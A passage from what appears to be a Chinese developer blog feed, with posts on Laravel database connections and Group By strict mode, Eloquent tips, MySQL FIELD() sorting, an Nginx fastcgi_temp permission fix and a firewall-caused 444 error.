class="code"><pre><span class="line"><span class="string">'mysql'</span> =&gt; [</span><br><span class="line">        <span class="string">'driver'</span> =&gt; <span class="string">'mysql'</span>,</span><br><span class="line">        <span class="string">'host'</span> =&gt; env(<span class="string">'DB_HOST'</span>, <span class="string">'localhost'</span>),</span><br><span class="line">        <span class="string">'port'</span> =&gt; env(<span class="string">'DB_PORT'</span>, <span class="string">'3306'</span>),</span><br><span class="line">        <span class="string">'database'</span> =&gt; env(<span class="string">'DB_DATABASE'</span>, <span class="string">'forge'</span>),</span><br><span class="line">        <span class="string">'username'</span> =&gt; env(<span class="string">'DB_USERNAME'</span>, <span class="string">'forge'</span>),</span><br><span class="line">        <span class="string">'password'</span> =&gt; env(<span class="string">'DB_PASSWORD'</span>, <span class="string">''</span>),</span><br><span class="line">        <span class="string">'charset'</span> =&gt; <span class="string">'utf8'</span>,</span><br><span class="line">        <span class="string">'collation'</span> =&gt; <span class="string">'utf8_unicode_ci'</span>,</span><br><span class="line">        <span class="string">'prefix'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'strict'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">        <span class="string">'engine'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">],</span><br><span class="line"></span><br><span class="line"><span class="string">'mysql_center'</span> =&gt; [</span><br><span class="line">        <span class="string">'driver'</span> =&gt; <span class="string">'mysql'</span>,</span><br><span class="line">        <span class="string">'host'</span> =&gt; env(<span class="string">'DB_HOST_CENTER'</span>, <span class="string">'localhost'</span>),</span><br><span class="line">        <span class="string">'port'</span> =&gt; env(<span class="string">'DB_PORT_CENTER'</span>, <span class="string">'3306'</span>),</span><br><span class="line">        <span class="string">'database'</span> =&gt; env(<span class="string">'DB_DATABASE_CENTER'</span>, <span class="string">'forge'</span>),</span><br><span class="line">        <span class="string">'username'</span> =&gt; env(<span class="string">'DB_USERNAME_CENTER'</span>, <span class="string">'forge'</span>),</span><br><span class="line">        <span class="string">'password'</span> =&gt; env(<span class="string">'DB_PASSWORD_CENTER'</span>, <span class="string">''</span>),</span><br><span class="line">        <span class="string">'charset'</span> =&gt; <span class="string">'utf8'</span>,</span><br><span class="line">        <span class="string">'collation'</span> =&gt; <span class="string">'utf8_unicode_ci'</span>,</span><br><span class="line">        <span class="string">'prefix'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'strict'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">        <span class="string">'engine'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">],</span><br></pre></td></tr></table></figure><h3 id="使用方式一"><a href="#使用方式一" class="headerlink" title="使用方式一"></a>使用方式一</h3><p>在模型中指定需要连接的数据库：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果没有指定数据库连接，则会使用默认的 mysql 连接</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserModel</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">      <span class="comment">// 数据库'database'中的users表</span></span><br><span class="line">      <span class="keyword">protected</span> $table = <span class="string">"users"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定mysql_center 作为数据库连接</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserModel</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">      <span class="comment">// 数据库'dadtabase_center'中的users表</span></span><br><span class="line">      <span class="keyword">protected</span> $connection = <span class="string">'mysql_center'</span>;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">protected</span> $table = <span class="string">"users"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，当再次使用该模型时，其背后连接的就是新的数据库。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UserModel::find(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// [2021-08-17 21:32:53] DEV.DE<span class="doctag">BUG:</span> [database_center] [54.96ms] select * from `user` where `uid` = '1'</span></span><br></pre></td></tr></table></figure><h3 id="使用方式二"><a href="#使用方式二" class="headerlink" title="使用方式二"></a>使用方式二</h3><p>上面是为模型指定数据库连接，那么有没有什么办法为单个查询指定连接？</p><p>也是可以的。</p><p>使用该方式之前，也需要提前配置好需要连接的数据库</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$data = DB::connection(<span class="string">"mysql_center"</span>)</span><br><span class="line">    -&gt;table(<span class="string">"user"</span>)</span><br><span class="line">    -&gt;get();</span><br></pre></td></tr></table></figure><p>这样就可以在不改变模型属性的情况下，查询到其他数据库的数据了。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://learnku.com/laravel/wikis/16106" target="_blank" rel="noopener">Laravel 数据库：连接多个 MySQL 数据库</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Laravel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel Group By 异常记录</title>
      <link href="/laravel-uses-group-by-exception-logging/"/>
      <url>/laravel-uses-group-by-exception-logging/</url>
      
        <content type="html"><![CDATA[<p>前段时间用Laravel 做项目，使用Group By时，总是会遇到的一个错误，具体异常信息如下：</p><a id="more"></a><blockquote><p>Illuminate\Database\QueryException: SQLSTATE[42000]: Syntax error or access violation: 1140 In aggregated query without GROUP BY, expression #2 of SELECT list contains nonaggregated column ‘database.table.id’; this is incompatible with sql_mode=only_full_group_by </p></blockquote><p>这个错误很眼熟，其原因是对于聚合操作（如：sum、max、min等），如果在SELECT 中的列，没有在GROUP BY中出现，那么这个SQL是不合法的，因为列不在GROUP BY从句中。</p><p>简而言之，就是SELECT 后面接的列必须被GROUP BY 后面接的列所包含。</p><p>可是同样的SQL，在数据库中是可以正常执行的，为什么在Laravel 下却总是会报错呢？</p><p>当时也是因为项目紧急，没具体深究其原因。</p><p>今天无意间看到一篇文章——<a href="http://www.manongjc.com/detail/24-naczktadrzjmysh.html" target="_blank" rel="noopener">Laravel使用group by报错的问题</a>，正好把这个问题给讲明白了。</p><p>原来是因为开发者在Laravel <code>5.3</code> 版本后增加一个数据库的<code>strict</code> 模式，其中一个开发者对于增加这个模式的看法很有意思：</p><blockquote><p>Adam14Four ：<br>To be completely honest, I don’t remember exactly what the details were, but it was some sort of data-loss problem.<br>说真的，我也忘了具体的细节了，可能是因为数据丢失排序的问题。</p></blockquote><p>Laravel <code>8.x</code> 版本，默认会启用该模式，启用时，会造成以下影响：</p><blockquote><p>fernandobandeira：<br>1 - Add all columns to group by.<br>group by需要所有的列。<br>2 - Won’t be able to use date’s such as 0000-00-00 00:00:00.<br>时间不能使用0000-00-00 00:00:00的数据。<br>3 - Fields like boolean will throw fatal if you pass something that isn’t a boolean value, like 1, before it would convert it to true and save, with strict it fails.<br>字段如果是boolean类型，但是传入一个非boolean如「1」将会抛出一个致命错误。在非strict模式下会自动转换成true并保存。<br>4 - You’ll get an error if you divide a field by 0 (or another field that has 0 as value).<br>如果一个字段除以0将会得到一个错误（或者其他有0值的字段）</p></blockquote><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p><strong>1. 最简单的方案，关闭该模式即可：</strong></p><p>编辑<code>/config/database.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'connections'</span> =&gt; [</span><br><span class="line">    <span class="string">'mysql'</span> =&gt; [</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="string">'strict'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">    ],</span><br><span class="line">],</span><br></pre></td></tr></table></figure><p><strong>2. 配置modes</strong></p><p>编辑<code>/config/database.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'connections'</span> =&gt; [</span><br><span class="line">    <span class="string">'mysql'</span> =&gt; [</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="string">'modes'</span> =&gt; [</span><br><span class="line">            <span class="string">'ONLY_FULL_GROUP_BY'</span>,</span><br><span class="line">            <span class="string">'STRICT_TRANS_TABLES'</span>,</span><br><span class="line">            <span class="string">'NO_ZERO_IN_DATE'</span>,</span><br><span class="line">            <span class="string">'NO_ZERO_DATE'</span>,</span><br><span class="line">            <span class="string">'ERROR_FOR_DIVISION_BY_ZERO'</span>,</span><br><span class="line">            <span class="string">'NO_AUTO_CREATE_USER'</span>,</span><br><span class="line">            <span class="string">'NO_ENGINE_SUBSTITUTION'</span>,</span><br><span class="line">        ],</span><br><span class="line">    ],</span><br><span class="line">],</span><br></pre></td></tr></table></figure><p>不知为何，验证此方案时总是未生效。</p><p><strong>3. full group by</strong><br>如果不想关闭该模式，那就只有两种选择了：</p><ol><li>Full Group By：SELECT 查询的字段包含所有的Group By 的字段中</li><li>ANY_VALUE：这是一个Mysql 的函数，使用它可以临时跳过一些错误</li></ol><p>但需要注意的是，这种方案并不会“一劳永逸”，以后的每一次Group By 还是会面临相同的问题。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="http://www.manongjc.com/detail/24-naczktadrzjmysh.html" target="_blank" rel="noopener">Laravel使用group by报错的问题</a></li><li><a href="https://github.com/laravel/framework/issues/14997" target="_blank" rel="noopener">query that worked in Laravel 5.2 gives me error in Laravel 5.3</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Laravel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次由 Nginx fastcgi_temp 权限不足引起的问题</title>
      <link href="/note-a-problem-caused-by-insufficient-nginx-fastcgi_temp-permission/"/>
      <url>/note-a-problem-caused-by-insufficient-nginx-fastcgi_temp-permission/</url>
      
        <content type="html"><![CDATA[<p>今天在正式环境收到同事反馈的一个问题：主页可以打开，但是部分列表始终无法访问。</p><a id="more"></a><p>一开始，我以为是接口抛出异常了，但是打开浏览器控制台看到响应 状态为“200 OK”，同时可以看到<code>Console</code> 下有一个<code>error</code>。</p><p>异常信息为：<code>NET::ERR_INCOMPLETE_CHUNKED_ENCODING 200 (OK)</code>。</p><h2 id="解决过程"><a href="#解决过程" class="headerlink" title="解决过程"></a>解决过程</h2><p>由Http Status Code 可以判断出，这个错误跟接口没有关系，接口如果有问题，状态码一定不会是 200 。</p><p>既然和接口没有关系，那就极可能是服务端环境导致的问题了。</p><p> 想明白这一点之后，马上查看Nginx 近期的错误日志。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2021&#x2F;08&#x2F;04 14:59:37 [crit] 11712#0: *244402125 open() &quot;&#x2F;www&#x2F;server&#x2F;nginx&#x2F;fastcgi_temp&#x2F;0&#x2F;94&#x2F;0000005940&quot; failed (13: Permission denied) while reading upstream, client: 116.24.95.208, server: api.nwppm.com, request: &quot;POST &#x2F;xxxx&#x2F;xxxx&#x2F;index HTTP&#x2F;1.1&quot;, upstream: &quot;fastcgi:&#x2F;&#x2F;unix:&#x2F;tmp&#x2F;php-cgi-74.sock:&quot;, host: &quot;api.nwppm.com&quot;, referrer: &quot;http:&#x2F;&#x2F;xxxx.xxxx.com&#x2F;&quot;</span><br></pre></td></tr></table></figure><p>果然没猜错，就是因为文件夹权限不足引起的异常。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>找到原因后就好办了，既然是因为<code>factcgi_temp</code> 文件夹权限不足引起的，那么解决方案就是更新权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod -R 740 /www/server/nginx/fastcgi_temp</span><br></pre></td></tr></table></figure><h2 id="问题还原"><a href="#问题还原" class="headerlink" title="问题还原"></a>问题还原</h2><p>问题虽然解决了，但还不知道是什么原因造成的，如果就此放下，估计今晚都会睡不着觉的…</p><p>在搞清楚这个问题之前，先来回顾一下<code>PHP-FPM</code> 与 Nginx 的协程流程：</p><ol><li>当客户端发起一个请求到服务端，Nginx 首先会判断该请求是静态还是动态？</li><li>如果是静态，直接返回对应的静态资源。</li><li>如果是动态，FastCGI 会将该请求转发给本地 <code>9000</code> 端口（9000 是 PHP—FPM 所监听的端口）或者 sock。</li><li>PHP-FPM 主进程接收到请求之后，<br>会分配一个空闲的 Worker 进程去处理这个请求，处理完成之后将数据返回给 FastCGI，再由 Nginx 返回给客户端。</li></ol><p>以上是一个完整的HTTP 请求处理流程。其中Worker 进程处理完请求之后，会将数据返回给 FastCGI，再由Nginx 返回给客户端，这里就不得不提到Nginx 的Buffer 机制：</p><blockquote><p>对于来自 FastCGI Server 的 Response，Nginx 将其缓冲到内存中，然后依次发送到客户端浏览器。缓冲区的大小由 fastcgi_buffers 和 fastcgi_buffer_size 两个值控制。</p></blockquote><p>以下面这个配置进行说明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fastcgi_buffers      8 4K;</span><br><span class="line">fastcgi_buffer_size  4K;</span><br></pre></td></tr></table></figure><ul><li><code>fastcgi_buffers</code> 控制 nginx 最多创建 8 个大小为 4K 的缓冲区</li><li><code>fastcgi_buffer_size</code> 则是处理 Response 时第一个缓冲区的大小，不包含在前者中</li></ul><p>所以总计能创建的最大内存缓冲区大小是 8<em>4K+4K = 36k。而这些缓冲区是根据实际的 Response 大小动态生成的，并不是一次性创建的。比如一个 8K 的页面，Nginx 会创建 2</em>4K 共 2 个 buffers。</p><p>当 Response 小于等于 36k 时，所有数据当然全部在内存中处理。如果 Response 大于 36k 呢？<code>fastcgi_temp</code> 的作用就在于此，多出来的数据会被临时写入到文件中，放在这个目录<br>下面。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://blog.csdn.net/crx05/article/details/70210323" target="_blank" rel="noopener">分析 fastcgi_temp 错误以及 Nginx 的 Buffer 机制</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Nginx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Nginx </tag>
            
            <tag> PHP-FPM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel Eloquent 高阶用法整理</title>
      <link href="/laravel-eloquent-advanced-usage/"/>
      <url>/laravel-eloquent-advanced-usage/</url>
      
        <content type="html"><![CDATA[<p>这篇笔记用来整理Laravel Eloquent 的一些高级用法。</p><a id="more"></a><h2 id="hidden-visible"><a href="#hidden-visible" class="headerlink" title="hidden/visible"></a>hidden/visible</h2><p>有时可能会遇到需要隐藏/显示属性的需求，尽管Eloquent ORM 为我们提供了<code>hidden</code>、<code>visible</code> 属性，但如果能动态设置，似乎更不错。</p><p><code>src/Illuminate/Database/Eloquent/Concerns/HidesAttributes.php</code> Tarit 为我们提供了几个不错的方法：</p><ul><li><code>getVisible</code>：获取白名单</li><li><code>setVisible</code>：设置白名单</li><li><code>makeVisible</code>：追加白名单</li><li><code>getHidden</code>：获取黑名单</li><li><code>setHidden</code>：设置黑名单</li><li><code>makeHidden</code>：追加黑名单</li></ul><h3 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$user = UserModel::find(<span class="number">1</span>)-&gt;makeHidden([<span class="string">"remember_token"</span>]);</span><br><span class="line"></span><br><span class="line">$user-&gt;remember_token;</span><br><span class="line"><span class="comment">// obvQx5ZVZAoAVmWwkB-STy8xVPV1</span></span><br></pre></td></tr></table></figure><blockquote><p>需要注意一点的是，虽然属性被我们隐藏了，但如果仍需要使用该属性的话，还是可以通过<code>-&gt;</code> 获取到</p></blockquote><h2 id="Accessors"><a href="#Accessors" class="headerlink" title="Accessors"></a>Accessors</h2><p>要定一个Accessors，需要在模型中创建一个名称为<code>getXxxAttribute</code> 的方法，其中的 <code>Xxx</code> 是驼峰命名法的字段名。</p><p>通过属性获取器，我们可以很轻松地为属性赋予新的值，但如果想要获取赋值之前的值，那么该如何做呢？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getContentAttribute</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strip_tags($value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>src/Illuminate/Database/Eloquent/Concerns/HasAttributes.php</code> Tarit 为我们提供了几个不错的方法：</p><ul><li><code>getAttributes</code>：获取赋值之前的值</li><li><code>getAttribute</code>：获取指定Key，修饰之后的值</li><li><code>getAttributeValue</code>：获取指定Key，修饰之后的值</li><li><code>setAttribute</code>：为属性赋值</li><li><code>getMutatedAttributes</code>：获取需要赋值的Key</li></ul><blockquote><p>需要注意的是：以上这些Api 仅适用于模型的实例对象，对于集合不能直接使用</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UserModel::find(<span class="number">1</span>)-&gt;getAttributes();     ✅</span><br><span class="line"></span><br><span class="line">UserModel::get()-&gt;getAttributes();       ❎</span><br></pre></td></tr></table></figure><h3 id="最佳实践-1"><a href="#最佳实践-1" class="headerlink" title="最佳实践"></a>最佳实践</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$notice = NoticeModel::find(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">$notice-&gt;content;     <span class="comment">// Hello World</span></span><br><span class="line"></span><br><span class="line">$notice-&gt;getAttribute(<span class="string">"content"</span>);   <span class="comment">// &lt;p&gt;Hello World&lt;/p&gt;</span></span><br></pre></td></tr></table></figure><h2 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h2><p>数据分页有多种方法，最简单的是使用 <a href="https://learnku.com/docs/laravel/laravel/8.x/queries" target="_blank" rel="noopener">查询构造器</a> 或 <a href="https://learnku.com/docs/laravel/laravel/8.x/eloquent" target="_blank" rel="noopener">Eloquent query</a> 的 <code>paginate</code> 方法。</p><p>但有些时候，因为一些原因，我们不想使用 <code>paginate</code> 自动创建分页，那有没有什么办法可以手动创建分页呢？</p><p>答案是有的，Laravel 提供以下两种方式：</p><ul><li><code>Illuminate\Pagination\Paginator</code>：相当于查询构造器或 Eloquent 的 <code>simplePaginate</code> 方法。</li><li><code>Illuminate\Pagination\LengthAwarePaginator</code>：相当于查询构造器或 Eloquent 的 <code>paginate</code> 方法。</li></ul><h3 id="最佳实践-2"><a href="#最佳实践-2" class="headerlink" title="最佳实践"></a>最佳实践</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">UserModel::where(<span class="string">"age"</span>, <span class="string">"&gt;"</span>, <span class="number">18</span>)-&gt;paginate(<span class="number">15</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等效于</span></span><br><span class="line">$data = UserModel::where(<span class="string">"age"</span>, <span class="string">"&gt;"</span>, <span class="number">18</span>)-&gt;get();</span><br><span class="line"><span class="keyword">new</span> LengthAwarePaginator($data, $data-&gt;count(), <span class="number">15</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等效于</span></span><br><span class="line">$data = UserModel::where(<span class="string">"age"</span>, <span class="string">"&gt;"</span>, <span class="number">18</span>)-&gt;get();</span><br><span class="line"><span class="keyword">new</span> Paginator($data, <span class="number">15</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Laravel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql 如何自定义排序</title>
      <link href="/how-to-customize-sorting-in-mysql/"/>
      <url>/how-to-customize-sorting-in-mysql/</url>
      
        <content type="html"><![CDATA[<p>在Mysql 中，想要对结果进行排序，通常会使用<code>Order By</code> 子句，使用时，应注意以下几点：</p><ul><li>在Order By 子句中，使用 ASC 或 DESC 关键字来设置查询结果是按升序或降序排列; 默认按升序（ASC）排列</li><li>Order By 子句可以指定多个排序键</li><li>存在多个排序键时，优先使用左侧的键，如果该列存在相同值的话，则按右侧的键进行排列</li><li>如果排序键的值包含NULL，则会在开头或者结尾进行汇总（按最小值对待）</li></ul><a id="more"></a><blockquote><p>存在多个排序键时需要注意，第一列必须有相同的值，才会对第二个列进行排序; 如果第一个列的所有值都是唯一的，那么Mysql 将不再对第二个列进行排序。</p></blockquote><p>这篇笔记的重点是记录如何在Mysql中 使用自定义排序。</p><p>为什么会有这样的需求呢？</p><p>在回答这个问题之前，先来看这样一个场景。</p><p>假设现在有一张审核记录表：</p><table><thead><tr><th>字段名称</th><th>字段类型</th><th>字段默认值</th><th>是否允许为空</th><th>索引</th><th>示例值</th><th>字段描述</th></tr></thead><tbody><tr><td>id</td><td>Bigint(16)</td><td>Unsigned 自增</td><td>否</td><td>主键</td><td>1</td><td>主键 ID</td></tr><tr><td>uid</td><td>Bigint(16)</td><td>0</td><td>否</td><td>普通索引</td><td>1</td><td>用户 ID</td></tr><tr><td>status</td><td>Tinyint(1)</td><td>0</td><td>否</td><td>-</td><td>0</td><td>审核状态（1. 等待审核 2. 审核通过 3. 审核拒绝）</td></tr><tr><td>created_at</td><td>Timestamp</td><td></td><td>否</td><td>-</td><td>2021-06-03 21:54:53</td><td>创建时间</td></tr><tr><td>updated_at</td><td>Timestamp</td><td></td><td>是</td><td>-</td><td>2021-06-03 21:54:57</td><td>更新时间</td></tr></tbody></table><p>原本是按照这样的顺序进行排序的：<code>待审核=&gt; 审核通过=&gt; 审核拒绝</code></p><p>对应SQL 应该是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table</span><br><span class="line">ORDER BY status</span><br></pre></td></tr></table></figure><p>假如有一天需求发生了变化，需要优先将审核通过的排在前面，其次是等待审核，最后才是审核拒绝。</p><p>此时，你肯定不想将已经写好的代码再“重构”一次，手动将<code>待审核</code> 与 <code>审核通过</code> 的顺序进行调换。一来是，可能会将现有完整的功能，改出问题，二来是，如果后面排序需求再次发生变化，就得再次面临相同的问题。</p><blockquote><p>如果Mysql 能自定义排序，那该多好啊。</p></blockquote><p>不禁会这样去想。</p><p>可以使用Mysql 的字符串函数——<a href="https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_field" target="_blank" rel="noopener">FIELD</a>，在不改变现有逻辑的基础上，仅仅只改变排序顺序。</p><p>对应SQL 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table</span><br><span class="line">ORDER BY FIELD(status, 2, 1, 3)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次服务端防火墙引起的 444 错误</title>
      <link href="/444-errors-caused-by-a-server-firewall/"/>
      <url>/444-errors-caused-by-a-server-firewall/</url>
      
        <content type="html"><![CDATA[<p>这周接手一个需求，需要做一个Http“代理”，将请求转发至不同的场景。</p><a id="more"></a><p>本来不是多复杂的需求，实现起来也没花多久，反而是在部署测试上面，耗费不少时间。</p><p>本地测试一切正常之后，变将代码部署至服务端，因为服务器使用宝塔，部署过程也很快。</p><p>可是问题就出在了，测试过程中。</p><p>起初我只是察觉，代理服务端收到请求之后，一直没有将请求转发出去，于是查看请求日志，发现满屏的<code>http 444</code>。</p><p>这个时候，我只是比较困惑，本地发送相同的请求都是正常的，怎么来自客户端的请求就有问题了。</p><p>于是，查了一下这个 <a href="https://httpstatuses.com/444" target="_blank" rel="noopener">444</a> 状态码。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210724152825.png" alt=""></p><p>它实际上并不是一个标准的 HTTP Status Codes，而是Nginx 自定义的一个Code，通常用于<strong>服务端没有返回信息给客户端并且关闭了连接</strong>的场景。</p><blockquote><p>服务端的Nginx 为什么会关闭连接？通常由以下两类原因引起：</p></blockquote><ol><li>客户端发送恶意的请求</li><li>客户端发送格式错误的请求</li></ol><p>想清楚这两点之后，我对比了一下本地发送的请求，与客户端发送的请求之间的差异：</p><p>本地：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl --location --request POST <span class="string">'http://xxx.xxx.com/route'</span> \</span><br><span class="line">--header <span class="string">'User-Agent: PostmanRuntime/7.28.2'</span> \</span><br><span class="line">--form <span class="string">'params=xxxx'</span> \</span><br><span class="line">--form <span class="string">'params=xxxx'</span></span><br></pre></td></tr></table></figure><p>客户端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl --location --request POST <span class="string">'http://xxx.xxx.com/route'</span> \</span><br><span class="line">--header <span class="string">'User-Agent: Apache-HttpClient/4.4.1'</span> \</span><br><span class="line">--form <span class="string">'params=xxxx'</span> \</span><br><span class="line">--form <span class="string">'params=xxxx'</span></span><br></pre></td></tr></table></figure><p>除了<code>User-Agent</code> 不同，其余信息均一致。</p><p>为了验证我的猜想，打开宝塔的Nginx 防火墙站点日志，果然，全部被拦截了：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210724154555.png" alt=""></p><p>至于为什么UA 中携带了<code>Apache-HttpClient/4.4.1</code> 这几个关键字就被拦截了，可以通过宝塔默认的<code>User-Agent过滤</code> 规则中找到答案：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210724155612.png" alt=""></p><p>可以很清晰地看到，关键词过滤规则中，有一个<code>Apache-HttpClient</code>。</p><p>知道原因之后就好办了，将关键词过滤的开关给关了，服务即可正常访问。</p>]]></content>
      
      
      <categories>
          
          <category> 防火墙 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 防火墙 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何在 Laravel 中使用 RabbitMQ</title>
      <link href="/how-to-use-rabbitmq-in-laravel/"/>
      <url>/how-to-use-rabbitmq-in-laravel/</url>
      
